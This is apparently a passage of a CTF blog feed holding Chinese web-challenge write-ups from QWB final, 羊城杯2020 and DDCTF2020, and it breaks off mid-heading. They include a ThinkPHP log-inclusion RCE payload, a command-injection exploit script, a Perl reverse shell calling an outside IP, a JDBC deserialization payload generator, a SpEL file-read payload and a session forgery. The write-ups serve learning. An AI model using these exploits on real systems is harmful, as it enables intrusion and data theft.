  */    public function _empty($methed_name){        $this-&gt;display($methed_name);        exit(0);    }    /**     * 配合thinkphp分页示例     */    public function page(){        // 获取总条数        $count=M(&#39;Province_city_area&#39;)-&gt;count();        // 每页多少条数据        $limit=200;        $page=new \Org\Nx\Page($count,$limit);        $data=M(&#39;Province_city_area&#39;)            -&gt;limit($page-&gt;firstRow.&#39;,&#39;.$page-&gt;listRows)            -&gt;select();        echo json_encode($data);    }}</code></pre><blockquote><h1 id="ThinkPHP-Action中的-empty方法"><a href="#ThinkPHP-Action中的-empty方法" class="headerlink" title="ThinkPHP Action中的_empty方法"></a>ThinkPHP Action中的_empty方法</h1><p>_empty方法即空操作，当找不到请求的方法时，默认执行该方法，利用这个机制，我们可以实现错误页面和一些URL的优化。</p><pre><code>public function _empty($name){   echo $name;}</code></pre><p>参数name,即请求的方法名。如<a href="http://localhost/waimai/index.php/Index/sdfewsdf,不存在sdfewsdf方法时，会调用_empty方法，显示sdfewsdf" target="_blank" rel="noopener">http://localhost/waimai/index.php/Index/sdfewsdf,不存在sdfewsdf方法时，会调用_empty方法，显示sdfewsdf</a>.</p></blockquote><p>当我们调用一个不存在的action时，它会<code>display ($method)</code> ，这将会造成任意模板调用</p><p>我们利用<code>index.php?m=Home&amp;c=Vue&amp;a=evil_path</code>来调用任意模板，我们可以利用日志文件作为模板文件从而RCE</p><p>最后的payload:</p><pre><code>index.php/Home.php?m=Home&amp;c=Vue&amp;a=Runtime/Logs/User/20_09_17.logindex.php/Home/Vue/web_page&amp;content=&lt;?php/**/phpinfo();</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/09/21/2020-QWB-final-bjyadmin/">https://www.ccreater.top/2020/09/21/2020-QWB-final-bjyadmin/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯2020</title>
      <link href="2020/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/"/>
      <url>2020/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/</url>
      
        <content type="html"><![CDATA[<h1 id="羊城杯-2020"><a href="#羊城杯-2020" class="headerlink" title="羊城杯 2020"></a>羊城杯 2020</h1><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>这次拿了第三，帮苏哥扬名很开心（队名：甜甜的恋爱与苏哥有关）:joy:</p><p>对于我这个🥬:baby_chick: 来说还是挺好的</p><h2 id="com"><a href="#com" class="headerlink" title="com"></a>com</h2><pre><code>360 883 394 719 183 923 431 873 678 798 1007 1018 160 467 684 288 801 251 991 721 326 529 479 786 199 275 814 835 956 176 720 549 590 304 816 10514983822 520 807 909 36 513 663 319 527 806 190 213 750 260 358 516 188 882 695 619 118 304 277 459 822 123 356 630 802 1011 556 408 545 896 953 8672626717 243 440 842 40 779 127 408 537 150 918 925 462 890 277 743 448 595 267 115 299 681 929 166 648 428 326 72 595 895 557 752 442 210 286 764721320 664 312 720 579 938 821 802 172 465 661 121 569 730 669 530 12 503 480 798 481 917 238 85 654 638 869 676 583 655 17 899 346 585 124 9059689642 599 51 755 409 640 239 70 69 919 913 104 203 524 770 930 251 373 292 499 603 69 813 1010 937 315 191 719 444 127 987 85 848 955 363 8105071488 718 257 133 1007 142 897 70 65 160 546 648 790 448 900 310 18 523 392 595 640 284 849 83 384 976 44 472 434 829 987 111 92 789 993 7583209464 669 740 236 876 266 534 597 799 290 619 812 655 897 159 810 606 808 763 577 498 953 1016 7 736 50 734 397 1 883 456 278 883 1006 301 9813063388 364 318 475 753 473 753 375 84 26 520 184 1023 971 263 973 896 839 60 306 772 910 787 174 518 325 205 136 808 902 638 980 418 624 882 8934784332 666 462 268 190 331 76 999 931 686 237 525 612 201 136 920 398 836 122 582 710 348 873 127 606 851 197 194 393 799 399 934 975 53 145 8265602676 158 397 796 891 277 301 561 658 231 587 807 508 73 420 990 797 137 656 494 886 556 698 601 314 28 942 799 906 762 235 745 422 112 69 8906990938 405 685 339 53 44 861 233 836 74 647 843 760 634 999 658 815 652 376 172 839 388 224 28 846 815 52 404 987 927 790 489 376 56 459 889894378 412 817 519 588 469 810 178 309 694 567 301 598 792 433 279 772 949 899 848 914 611 861 719 401 129 786 912 708 284 940 784 197 988 940 10115461938 689 506 915 568 882 291 554 97 888 914 740 388 698 422 481 443 454 904 430 1010 826 972 728 342 519 212 909 708 518 691 258 494 363 981 10279244894 865 667 844 496 337 748 686 153 776 727 287 798 108 14 335 680 138 340 65 405 494 927 664 871 522 900 54 655 500 750 56 111 273 496 7192064319 675 450 810 219 268 31 424 732 1017 800 650 806 124 463 461 242 149 999 647 891 658 717 377 313 876 64 298 472 708 272 436 953 525 840 8669041913 929 896 460 18 367 976 883 263 120 988 417 702 1019 399 651 353 423 112 311 862 683 275 478 739 893 135 809 63 364 181 507 18 996 414 8964322351 716 903 476 21 109 861 592 327 136 354 114 928 288 33 308 60 44 553 326 601 63 741 802 239 752 495 933 875 172 613 353 554 976 854 7215073786 784 387 450 624 575 553 154 71 714 469 669 896 502 869 831 202 150 743 368 165 240 728 536 1019 55 1006 170 295 613 441 502 989 409 798 86818688 608 378 623 140 832 641 685 683 820 728 949 310 510 452 666 602 513 39 852 278 28 978 306 616 280 824 36 768 964 596 874 922 959 18 9009965434 238 147 2 64 820 473 110 876 711 891 1021 380 230 936 112 558 534 858 218 436 800 366 94 644 839 1016 727 863 524 732 505 688 996 694 9323233366 115 801 676 561 199 219 197 807 259 201 394 701 440 1019 120 696 631 562 965 621 105 385 133 687 589 226 743 604 813 180 537 68 727 417 7838602515 826 753 549 593 486 992 610 591 321 685 615 110 734 710 112 109 1017 755 68 552 217 682 558 861 1003 363 476 315 156 360 832 773 252 557 9223162883 747 540 720 679 478 45 910 84 841 1015 113 82 731 85 552 430 771 504 136 794 128 19 1005 878 327 582 535 846 344 146 531 991 711 414 8706730498 953 79 629 796 742 726 491 133 742 168 452 399 277 995 676 520 690 898 903 234 678 0 827 279 831 834 893 422 207 435 293 180 268 955 9970522552 172 551 90 291 336 616 943 47 317 48 628 644 434 738 707 620 479 504 319 101 906 128 270 346 596 740 819 928 233 31 869 279 701 158 7881629596 67 953 395 544 923 189 454 929 684 797 297 428 164 788 682 917 397 9 227 839 897 34 767 737 335 105 618 115 336 879 136 131 177 113 8566453717 31 5 257 845 545 419 569 9 366 684 133 52 346 30 203 101 433 635 974 840 262 632 751 53 217 454 638 53 154 267 396 784 800 311 7486378118 960 307 65 826 959 229 528 955 206 350 553 448 710 578 656 563 891 445 519 802 294 915 97 59 630 770 801 978 549 541 904 144 615 54 9364748238 455 363 647 684 400 1006 127 5 248 128 381 676 599 196 890 577 590 143 513 874 770 32 614 16 662 606 143 326 384 245 236 839 644 607 8370183223 896 922 223 149 897 873 184 350 824 393 38 625 84 50 64 857 889 104 365 177 964 397 941 904 1012 780 736 545 102 795 37 314 629 922 8391555838 497 263 731 631 662 851 125 914 527 536 424 635 373 502 389 433 22 752 119 558 701 227 585 688 947 15 741 164 800 547 685 537 676 864 9369252805 986 243 584 987 497 866 526 480 984 668 927 473 19 921 223 45 340 7 31 863 548 40 754 548 998 768 888 476 208 678 436 611 329 489 9724217598 15 64 563 597 442 689 980 174 862 457 745 631 546 580 596 549 1011 286 93 74 143 56 72 206 756 72 125 844 1015 1000 928 474 884 594 7947611784 441 438 394 802 590 323 525 357 778 906 194 873 197 192 746 363 689 160 802 302 856 335 118 1016 304 193 767 308 585 523 494 437 346 859 83642951003 992 57 630 267 37 731 281 607 181 296 487 96 736 523 243 337 88 508 643 765 267 619 628 544 581 971 105 608 297 709 281 424 257 902 8652387</code></pre><p>观察格式发现是一个36*35的矩阵，很容易想到是一个35元一次线性方程组</p><pre><code>from z3 import *a=&quot;&quot;&quot;360 883 394 719 183 923 431 873 678 798 1007 1018 160 467 684 288 801 251 991 721 326 529 479 786 199 275 814 835 956 176 720 549 590 304 816 10514983822 520 807 909 36 513 663 319 527 806 190 213 750 260 358 516 188 882 695 619 118 304 277 459 822 123 356 630 802 1011 556 408 545 896 953 8672626717 243 440 842 40 779 127 408 537 150 918 925 462 890 277 743 448 595 267 115 299 681 929 166 648 428 326 72 595 895 557 752 442 210 286 764721320 664 312 720 579 938 821 802 172 465 661 121 569 730 669 530 12 503 480 798 481 917 238 85 654 638 869 676 583 655 17 899 346 585 124 9059689642 599 51 755 409 640 239 70 69 919 913 104 203 524 770 930 251 373 292 499 603 69 813 1010 937 315 191 719 444 127 987 85 848 955 363 8105071488 718 257 133 1007 142 897 70 65 160 546 648 790 448 900 310 18 523 392 595 640 284 849 83 384 976 44 472 434 829 987 111 92 789 993 7583209464 669 740 236 876 266 534 597 799 290 619 812 655 897 159 810 606 808 763 577 498 953 1016 7 736 50 734 397 1 883 456 278 883 1006 301 9813063388 364 318 475 753 473 753 375 84 26 520 184 1023 971 263 973 896 839 60 306 772 910 787 174 518 325 205 136 808 902 638 980 418 624 882 8934784332 666 462 268 190 331 76 999 931 686 237 525 612 201 136 920 398 836 122 582 710 348 873 127 606 851 197 194 393 799 399 934 975 53 145 8265602676 158 397 796 891 277 301 561 658 231 587 807 508 73 420 990 797 137 656 494 886 556 698 601 314 28 942 799 906 762 235 745 422 112 69 8906990938 405 685 339 53 44 861 233 836 74 647 843 760 634 999 658 815 652 376 172 839 388 224 28 846 815 52 404 987 927 790 489 376 56 459 889894378 412 817 519 588 469 810 178 309 694 567 301 598 792 433 279 772 949 899 848 914 611 861 719 401 129 786 912 708 284 940 784 197 988 940 10115461938 689 506 915 568 882 291 554 97 888 914 740 388 698 422 481 443 454 904 430 1010 826 972 728 342 519 212 909 708 518 691 258 494 363 981 10279244894 865 667 844 496 337 748 686 153 776 727 287 798 108 14 335 680 138 340 65 405 494 927 664 871 522 900 54 655 500 750 56 111 273 496 7192064319 675 450 810 219 268 31 424 732 1017 800 650 806 124 463 461 242 149 999 647 891 658 717 377 313 876 64 298 472 708 272 436 953 525 840 8669041913 929 896 460 18 367 976 883 263 120 988 417 702 1019 399 651 353 423 112 311 862 683 275 478 739 893 135 809 63 364 181 507 18 996 414 8964322351 716 903 476 21 109 861 592 327 136 354 114 928 288 33 308 60 44 553 326 601 63 741 802 239 752 495 933 875 172 613 353 554 976 854 7215073786 784 387 450 624 575 553 154 71 714 469 669 896 502 869 831 202 150 743 368 165 240 728 536 1019 55 1006 170 295 613 441 502 989 409 798 86818688 608 378 623 140 832 641 685 683 820 728 949 310 510 452 666 602 513 39 852 278 28 978 306 616 280 824 36 768 964 596 874 922 959 18 9009965434 238 147 2 64 820 473 110 876 711 891 1021 380 230 936 112 558 534 858 218 436 800 366 94 644 839 1016 727 863 524 732 505 688 996 694 9323233366 115 801 676 561 199 219 197 807 259 201 394 701 440 1019 120 696 631 562 965 621 105 385 133 687 589 226 743 604 813 180 537 68 727 417 7838602515 826 753 549 593 486 992 610 591 321 685 615 110 734 710 112 109 1017 755 68 552 217 682 558 861 1003 363 476 315 156 360 832 773 252 557 9223162883 747 540 720 679 478 45 910 84 841 1015 113 82 731 85 552 430 771 504 136 794 128 19 1005 878 327 582 535 846 344 146 531 991 711 414 8706730498 953 79 629 796 742 726 491 133 742 168 452 399 277 995 676 520 690 898 903 234 678 0 827 279 831 834 893 422 207 435 293 180 268 955 9970522552 172 551 90 291 336 616 943 47 317 48 628 644 434 738 707 620 479 504 319 101 906 128 270 346 596 740 819 928 233 31 869 279 701 158 7881629596 67 953 395 544 923 189 454 929 684 797 297 428 164 788 682 917 397 9 227 839 897 34 767 737 335 105 618 115 336 879 136 131 177 113 8566453717 31 5 257 845 545 419 569 9 366 684 133 52 346 30 203 101 433 635 974 840 262 632 751 53 217 454 638 53 154 267 396 784 800 311 7486378118 960 307 65 826 959 229 528 955 206 350 553 448 710 578 656 563 891 445 519 802 294 915 97 59 630 770 801 978 549 541 904 144 615 54 9364748238 455 363 647 684 400 1006 127 5 248 128 381 676 599 196 890 577 590 143 513 874 770 32 614 16 662 606 143 326 384 245 236 839 644 607 8370183223 896 922 223 149 897 873 184 350 824 393 38 625 84 50 64 857 889 104 365 177 964 397 941 904 1012 780 736 545 102 795 37 314 629 922 8391555838 497 263 731 631 662 851 125 914 527 536 424 635 373 502 389 433 22 752 119 558 701 227 585 688 947 15 741 164 800 547 685 537 676 864 9369252805 986 243 584 987 497 866 526 480 984 668 927 473 19 921 223 45 340 7 31 863 548 40 754 548 998 768 888 476 208 678 436 611 329 489 9724217598 15 64 563 597 442 689 980 174 862 457 745 631 546 580 596 549 1011 286 93 74 143 56 72 206 756 72 125 844 1015 1000 928 474 884 594 7947611784 441 438 394 802 590 323 525 357 778 906 194 873 197 192 746 363 689 160 802 302 856 335 118 1016 304 193 767 308 585 523 494 437 346 859 83642951003 992 57 630 267 37 731 281 607 181 296 487 96 736 523 243 337 88 508 643 765 267 619 628 544 581 971 105 608 297 709 281 424 257 902 8652387&quot;&quot;&quot;a=a.splitlines()s=[]result=[0]*35for i in a:    s.append(i.split(&quot; &quot;))solve = Solver()X =  [Int(&#39;x%s&#39; % i) for i in range(35) ]for i in range(len(s)):    for j in range(len(s[i][:-1])):        result[i]+=int(s[i][j])*X[j]for i in range(len(s)):    solve.add(result[i]==int(s[i][-1]))print solve.check()m = solve.model()print &quot;traversing model...&quot;pri=[]for i in range(35):    pri.append(int(&quot;%s&quot; % (m[X[i]])))print pri</code></pre><p>GWHT{4b55c1d5fb6a0234fc252b19e510301a}</p><h2 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h2><p>直接命令执行</p><h2 id="blackhat"><a href="#blackhat" class="headerlink" title="blackhat"></a>blackhat</h2><p>查看Hei_Mao_Jing_Chang.mp3发现源文件代码：</p><pre><code>if(empty($_POST[&#39;Black-Cat-Sheriff&#39;]) || empty($_POST[&#39;One-ear&#39;])){    die(&#39;˭�����Ҳ���һֻ����β�ͣ�&#39;);}$clandestine = getenv(&quot;clandestine&quot;);if(isset($_POST[&#39;White-cat-monitor&#39;]))    $clandestine = hash_hmac(&#39;sha256&#39;, $_POST[&#39;White-cat-monitor&#39;], $clandestine);$hh = hash_hmac(&#39;sha256&#39;, $_POST[&#39;One-ear&#39;], $clandestine);if($hh !== $_POST[&#39;Black-Cat-Sheriff&#39;]){    die(&#39;������׼�����������������������Ҫ��׼��Ŀ�ꡣ�����Լ���������ǿ����а��ĵ��ӵ���&#39;);}echo exec(&quot;nc&quot;.$_POST[&#39;One-ear&#39;]);</code></pre><p>令<code>$_POST[&#39;White-cat-monitor&#39;]</code>为空从而控制<code>$clandestine</code></p><p>exp:</p><pre><code class="php">import hmacimport requestscmd=b&quot; ccreater.top:60006||cat /var/www/html/flag.php&quot;h = hmac.new(b&quot;&quot;, cmd, digestmod=&#39;sha256&#39;).hexdigest()burp0_url = &quot;http://183.129.189.60:10022/&quot;burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}burp0_data = {&quot;White-cat-monitor[]&quot;: &#39;&#39;, &quot;One-ear&quot;: cmd, &quot;Black-Cat-Sheriff&quot;: h}r=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)print(r.text)</code></pre><p>拿到flag</p><h2 id="easyphp2"><a href="#easyphp2" class="headerlink" title="easyphp2"></a>easyphp2</h2><p>扫目录发现robots.txt得到提示：</p><p><code>/?file=check.php</code></p><p>利用file处的任意文件读取获得 check.php内容（用zlib压缩绕过base64被ban），获得密码：GWHT,一次读取GWHT.php得知count参数可以任意命令执行,全局查找发现</p><p>/GWHT/system/of/a/down/flag.txt</p><p><code>http://183.129.189.60:10025/GWHT.php?count=123&#39;%26%26cat+/GWHT/system/of/a/down/flag.txt%26%26sss%26%26&#39;</code></p><p>/GWHT/目录下的readme存着GWHT的密码，去cmd5花一块钱解密得到密码</p><p>My password hash is 877862561ba0162ce610dd8bf90868ad414f0ec6. :<code>GWHTCTF</code> </p><p>/GWHT下findaas的内容（原本以为这个文件有S权限）</p><pre><code class="bash=">#! /bin/bashecho &quot;Enter a filename and find it here!&quot;find . -name $1</code></pre><p>利用反弹shell来登陆GWHT</p><p>反弹shell</p><pre><code>system(&#39;perl -e \&#39;use Socket;$i=&quot;39.108.164.219&quot;;$p=60007;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};\&#39;&#39;);</code></pre><p><code>GWHT{Y0U_H4VE_A_BETTER_SK1LL}</code></p><h2 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h2><p><a href="https://www.anquanke.com/post/id/203086" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203086</a><br>JDBC反序列化：<br>InfoInvocationHandler::invoke-&gt;Databaseinfo::checkAllInfo-&gt;DriverManager.getConnection</p><pre><code class="java=">@GetMapping(&quot;/hello&quot;)    public String hello(@CookieValue(value = &quot;data&quot;, required = false)String cookieData, Model model) {        if (cookieData == null || cookieData.equals(&quot;&quot;)) {            return &quot;redirect:/index&quot;;        }        Info info = (Info)deserialize(cookieData);        if (info != null) {            model.addAttribute(&quot;info&quot;, info.getAllInfo());        }        return &quot;hello&quot;;    }</code></pre><p>DatabaseInfo</p><pre><code class="java=">public class DatabaseInfo implements Serializable, Info {...    private void connect() {        String url = &quot;jdbc:mysql://&quot; + this.host + &quot;:&quot; + this.port + &quot;/jdbc?user=&quot; + this.username + &quot;&amp;password=&quot; + this.password + &quot;&amp;connectTimeout=3000&amp;socketTimeout=6000&quot;;        try {            this.connection = DriverManager.getConnection(url);        } catch (Exception e) {            e.printStackTrace();        }    }    @Override    public Boolean checkAllInfo() {        if (this.host == null || this.port == null || this.username == null || this.password == null) {            return false;        }        if (this.connection == null) {            connect();        }        return true;    }</code></pre><pre><code class="java=">public class InfoInvocationHandler implements InvocationHandler, Serializable {    private Info info;    public InfoInvocationHandler(Info info) {        this.info = info;    }    @Override    public Object invoke(Object proxy, Method method, Object[] args) {        try {            if (method.getName().equals(&quot;getAllInfo&quot;)) {                if (!this.info.checkAllInfo()) {                    return null;                }            }            return method.invoke(this.info, args);        } catch (Exception e) {            e.printStackTrace();            return null;        }    }}</code></pre><p>利用proxyinstance来调用InfoInvocationHandler 的invoke方法从而完成上述的利用链</p><p>利用这个来生成data</p><pre><code class="java=">import gdufs.challenge.web.invocation.InfoInvocationHandler;import gdufs.challenge.web.model.DatabaseInfo;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.Base64;public class test {    public static void main(String args[]){        DatabaseInfo db = new DatabaseInfo();        db.setHost(&quot;39.108.164.219&quot;);        db.setPort(&quot;60006&quot;);        //db.setUsername(&quot;yso_JRE8u20_calc&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;&quot;);        db.setUsername(&quot;Spring1&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;&quot;);        db.setPassword(&quot;123456&quot;);        InvocationHandler handler = new InfoInvocationHandler(db);        ByteArrayOutputStream bout = new ByteArrayOutputStream();        ObjectOutputStream out = null;        try {            out = new ObjectOutputStream(bout);            out.writeObject(Proxy.newProxyInstance(handler.getClass().getClassLoader(), db.getClass().getInterfaces(), handler));        } catch (IOException e) {            e.printStackTrace();        }        System.out.println(new String(Base64.getEncoder().encode(bout.toByteArray())));    }}</code></pre><p>测试发现CommonsCollections6和CommonsCollections5可以打通，但是由于Runtime.getRuntime().exec()中不能使用管道符等bash需要的方法,利用这个来绕过<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a><br><code>GWHT{5e97245bd9c98aad7040d461538e9231}</code></p><p>jdbc也可以直接读文件，但是这里不行，后来看别人的wp发现要加上设置：<code>allowLoadLocalInfile=true</code></p><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>写.htaccess从而rce</p><h2 id="easyser"><a href="#easyser" class="headerlink" title="easyser"></a>easyser</h2><p>老套路了</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/09/14/羊城杯2020/">https://www.ccreater.top/2020/09/14/羊城杯2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDCTF2020</title>
      <link href="2020/09/07/DDCTF2020/"/>
      <url>2020/09/07/DDCTF2020/</url>
      
        <content type="html"><![CDATA[<h1 id="DDCTF2020"><a href="#DDCTF2020" class="headerlink" title="DDCTF2020"></a>DDCTF2020</h1><h2 id="拼图游戏"><a href="#拼图游戏" class="headerlink" title="拼图游戏"></a>拼图游戏</h2><p>纯手工</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200906061331.png" alt="image80"></p><h2 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h2><p>根据题目提示得到两个接口</p><pre><code>Method | POSTURL    | http://117.51.136.197/admin/loginParam  | username str | pwd strResponsetoken str | auth(Certification information)- auth interfaceRequestMethod | POSTURL    | http://117.51.136.197/admin/authParam  | username str | pwd str | token strResponse</code></pre><p>用c-jwt-cracker爆破login生成的jwt</p><p>得到下一步入口：</p><pre><code>client dowload url: http://117.51.136.197/B5Itb8dFDaSFWZZo/client</code></pre><p>是一个go文件，叫二进制队友来逆</p><p>得到收发脚本：</p><pre><code class="python">import hmacimport base64import timeimport requestst = time.time()print(t)t = str(t)t = t[:10]cmd=&quot;99-9&quot;s = &quot;{}|&quot;.format(cmd) + tprint(s)t = bytes(s, encoding = &quot;utf8&quot;)message = tkey = b&#39;DDCTFWithYou&#39;h = hmac.new(key,message,digestmod=&#39;SHA256&#39;)signature=base64.b64encode(h.digest()).decode()burp0_url = &quot;http://117.51.136.197:80/server/command&quot;burp0_headers = {&quot;User-Agent&quot;: &quot;Go-http-client/1.1&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;, &quot;Accept-Encoding&quot;: &quot;gzip&quot;}burp0_json={&quot;signature&quot;:signature ,&quot;command&quot;: cmd,  &quot;timestamp&quot;: s[-10:]}print(burp0_json)r=requests.post(burp0_url, headers=burp0_headers, json=burp0_json,proxies={&quot;http&quot;:&quot;&quot;})print(r.text)</code></pre><p>但是在这里我卡住了，因为client是用go写的我也理所当然的认为后端也是用</p><p>go写的，于是就去试go的各种eval框架都不行，最后还是在别人的提示下才走出误区（应该写一个测试SSTI，eval等等的fuzz字典），经过一天的折腾后发现是SPeL</p><p>去网上找到了Ying师傅的payload</p><p><code>NEW java.util.Scanner(NEW java.io.BufferedReader(NEW java.io.FileReader(NEW java.io.File(&#39;/home/dc2-user/flag/flag.txt&#39;)))).nextLine()</code></p><p><code>DDCTF{Q24uf486whGOWN44UtZCjYUgdnnnRaVs}</code></p><h2 id="卡片商店"><a href="#卡片商店" class="headerlink" title="卡片商店"></a>卡片商店</h2><p>目标是让我们拿到100个卡片，但是有时间限制，利用借入和借出来获得100个卡片显然是不现实的。</p><p>刚开始想的是条件竞争，后来测试后发现不行，在这里我被卡住了。</p><p>继续测试发现，这里存在着整数溢出漏洞（卡片数是个大整数，而借入借出是个小整数），我们让卡片数不溢出，而借入数溢出，就可以得到许多卡片。接着我们得到了一个SecKey和获取flag的地址：<code>/flag</code>，但是需要我们是admin账号</p><p><code>session:MTU5OTIyNTI5MXxEdi1CQkFFQ180SUFBUkFCRUFBQV80dl9nZ0FDQm5OMGNtbHVad3dJQUFaM1lXeHNaWFFHYzNSeWFXNW5ERlFBVW5zaWIzZHBibWR6SWpwYlhTd2lhVzUyWlhOMGN5STZXMTBzSW0xdmJtVjVJam93TENKdWIzZGZkR2x0WlNJNk1UVTVPVEl5TlRJNU1Td2ljM1JoY25SZmRHbHRaU0k2TVRVNU9USXlOVEk1TVgwR2MzUnlhVzVuREFjQUJXRmtiV2x1QkdKdmIyd0NBZ0FBfMaqAqFFw43-8z8EcAFY04oenUI0FyhjaW8KZXGH2uSX</code></p><p>对session进行解密发现,他的格式类似：<code>base64encode(timestamp|base64urlencode(gob)|check)</code></p><p>利用<a href="https://gitlab.com/drosseau/degob" target="_blank" rel="noopener">https://gitlab.com/drosseau/degob</a> 获得gob内容</p><p><code>map[interface{}]interface{}{&quot;admin&quot;: false,&quot;wallet&quot;: &quot;{&quot;owings&quot;:[{&quot;OwingMoney&quot;:100000,&quot;NeedMoney&quot;:100002,&quot;OwingTime&quot;:1599223614}],&quot;invests&quot;:[{&quot;InvestMoney&quot;:100006,&quot;ReceiveMoney&quot;:100009,&quot;InvestTime&quot;:1599223644}],&quot;money&quot;:0,&quot;now_time&quot;:1599222955,&quot;start_time&quot;:1599222835}&quot;}</code></p><p>显然我们需要修改admin的值，在云屿师傅的帮助下知道了这是一个gin生成的session</p><pre><code class="go">package mainimport (        &quot;github.com/gin-contrib/sessions&quot;        &quot;github.com/gin-contrib/sessions/cookie&quot;        &quot;github.com/gin-gonic/gin&quot;)func main() {        r := gin.Default()        store := cookie.NewStore([]byte(&quot;Udc13VD5adM_c10nPxFu@v12&quot;))        r.Use(sessions.Sessions(&quot;session&quot;, store))        r.GET(&quot;/incr&quot;, func(c *gin.Context) {                session := sessions.Default(c)                var count bool                v := session.Get(&quot;admin&quot;)                if v == nil {                        count = true                } else {                        count = v.(bool)                        count = true                }                session.Set(&quot;admin&quot;, count)                session.Save()                c.JSON(200, gin.H{&quot;admin&quot;: count})        })        r.Run(&quot;:8000&quot;)}</code></pre><p>得到flag:<code>DDCTF{Th151s3AsY4ormE2333!}</code></p><h2 id="Overwrite-Me"><a href="#Overwrite-Me" class="headerlink" title="Overwrite Me"></a>Overwrite Me</h2><p>题目环境：PHP/5.6.10</p><p>题目源码：</p><pre><code class="php">Welcome to DDCTF 2020, Have fun!&lt;?phperror_reporting(0);class MyClass{    var $kw0ng;    var $flag;    public function __wakeup()    {        $this-&gt;kw0ng = 2;    }    public function get_flag()    {        return system(&#39;find /HackersForever &#39; . escapeshellcmd($this-&gt;flag));    }}class HintClass{       protected  $hint;    public function execute($value)    {        include($value);    }    public function __invoke()    {        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i&quot;, $this-&gt;hint))        {            die(&quot;Don&#39;t Do That!&quot;);        }        $this-&gt;execute($this-&gt;hint);    }}class ShowOff{    public $contents;    public $page;    public function __construct($file=&#39;/hint/hint.php&#39;)    {        $this-&gt;contents = $file;        echo &quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;&quot;;    }    public function __toString()    {        return $this-&gt;contents();    }    public function __wakeup()    {        $this-&gt;page-&gt;contents = &quot;POP me! I can give you some hints!&quot;;        unset($this-&gt;page-&gt;cont);    }}class MiddleMan{    private $cont;    public $content;    public function __construct()    {        $this-&gt;content = array();    }    public function __unset($key)    {        $func = $this-&gt;content;        return $func();    }}class Info{    function __construct()    {        eval(&#39;phpinfo();&#39;);    }}$show = new ShowOff();$bullet = $_GET[&#39;bullet&#39;];if(!isset($bullet)){    highlight_file(__FILE__);    die(&quot;Give Me Something!&quot;);}else if($bullet == &#39;phpinfo&#39;){    $infos = new Info();}else{    $obstacle1 = new stdClass;    $obstacle2 = new stdClass;    $mc = new MyClass();    $mc-&gt;flag = &quot;MyClass&#39;s flag said, Overwrite Me If You Can!&quot;;    @unserialize($bullet);    echo $mc-&gt;get_flag();}</code></pre><p>直接访问hint.php</p><p>得到：<code>Good Job! You&#39;ve got the preffix of the flag: DDCTF{VgQN6HXC2moDAq39And i&#39;ll give a hint, I have already installed the PHP GMP extension, It has a kind of magic in php unserialize, Can you utilize it to get the remaining flag? Go ahead!</code></p><p>看样子是要让我们利用GMP打他</p><p>这里不急先分析一下代码，构思一下可以利用的反序列化链</p><p><code>ShowOff::__wakeup-&gt;MiddleMan::__unset-&gt;$func();</code> </p><p>令<code>$func=[MyClass,&quot;get_flag&quot;]</code>实现任意命令执行，结束（GMP就不见了，盲猜出题人没限制好）</p><h2 id="Easy-Web"><a href="#Easy-Web" class="headerlink" title="Easy Web"></a>Easy 